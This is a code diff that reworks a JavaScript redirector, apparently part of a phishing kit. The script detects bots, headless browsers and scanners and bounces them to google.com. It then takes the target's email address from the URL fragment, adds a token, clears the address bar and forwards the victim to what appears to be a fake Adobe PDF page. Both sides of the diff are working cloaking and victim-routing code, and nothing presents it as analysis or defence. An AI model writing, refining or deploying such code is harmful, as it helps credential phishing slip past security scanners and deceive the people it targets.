@@ -1,17 +1,13 @@
-<script>
 (function () {
-  function isLikelyBot() {
-    try {
-      if (window.outerWidth === 0 || window.outerHeight === 0) return true;
-      if (navigator.webdriver) return true;
-      const ua = navigator.userAgent.toLowerCase();
-      if (/(headless|phantom|bot|crawl|spider|wget|curl)/i.test(ua)) return true;
-      if (navigator.plugins.length === 0) return true;
-      if (!navigator.language) return true;
-      return false;
-    } catch (e) {
-      return true;
-    }
+  // Bot detection
+  if (
+    window.outerWidth === 0 ||
+    window.outerHeight === 0 ||
+    navigator.webdriver ||
+    /HeadlessChrome|PhantomJS|bot|spider|crawl|curl|wget/i.test(navigator.userAgent)
+  ) {
+    window.location.href = "https://google.com";
+    throw new Error("Bot detected");
   }
 
   function generateSecureToken(length = 64) {
@@ -20,38 +16,30 @@
     return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
   }
 
-  function isValidEmail(email) {
-    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  function encodeData(data) {
+    return btoa(encodeURIComponent(data))
+      .replace(/\+/g, '-')
+      .replace(/\//g, '_')
+      .replace(/=+$/, '');
   }
 
-  document.addEventListener("DOMContentLoaded", () => {
-    if (isLikelyBot()) {
-      window.location.replace("https://google.com");
-      return;
-    }
+  const hash = window.location.hash.substring(1);
+  if (!hash || !hash.includes("@")) {
+    window.location.href = "https://google.com";
+    return;
+  }
 
-    const rawHash = window.location.hash.substring(1); // e.g., email@example.com
-    history.replaceState(null, "", window.location.pathname); // Remove it from URL
+  const email = hash;
+  const token = generateSecureToken();
 
-    try {
-      const decodedEmail = decodeURIComponent(rawHash);
+  sessionStorage.setItem("redirect_email", email);
+  sessionStorage.setItem("redirect_token", token);
 
-      if (isValidEmail(decodedEmail)) {
-        const token = generateSecureToken();
-        const encodedEmail = encodeURIComponent(decodedEmail);
+  history.replaceState(null, "", window.location.pathname + window.location.search);
 
-        sessionStorage.setItem("redirect_email", decodedEmail);
-        sessionStorage.setItem("redirect_token", token);
+  const encodedEmail = encodeData(email);
+  const redirectUrl = `pdf/adb.html#${encodedEmail}&token=${token}`;
 
-        setTimeout(() => {
-          window.location.href = `pdf/adb.html#${encodedEmail}&token=${token}`;
-        }, 300 + Math.random() * 500);
-      } else {
-        window.location.replace("https://google.com");
-      }
-    } catch (err) {
-      window.location.replace("https://google.com");
-    }
-  });
+  // Redirect immediately
+  window.location.href = redirectUrl;
 })();
-</script>
